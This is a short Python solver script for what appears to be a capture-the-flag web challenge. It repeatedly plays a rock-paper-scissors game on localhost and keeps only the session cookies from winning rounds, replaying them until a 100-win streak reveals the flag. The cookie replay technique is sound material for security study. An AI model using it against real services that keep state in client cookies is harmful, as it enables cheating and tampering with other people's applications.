# docker run -it -e URL=http://localhost:3000/ --network=host $(docker build -q ./solution)
import requests
import os
import urllib.parse
import re

URL = os.getenv("URL", "http://localhost:3000/")

last = 0
cookie = None
while True:

    r = requests.post(f"{URL}rpsls", data={"input": "rock"}, headers={
        "cookie": cookie
    }, allow_redirects=False)

    current = int(
        re.findall(r"s:(\d+)\.", urllib.parse.unquote(r.cookies["streak"]))[0]
    )
    if last < current:
        last = current
        cookie = r.headers["Set-Cookie"]
        print("Current streak: ", current)
    if current == 100:
        r = requests.get(f"{URL}", headers={
            "cookie": cookie
        })
        print(re.findall(r"Alpaca{.+}",r.text)[0])
        break

    
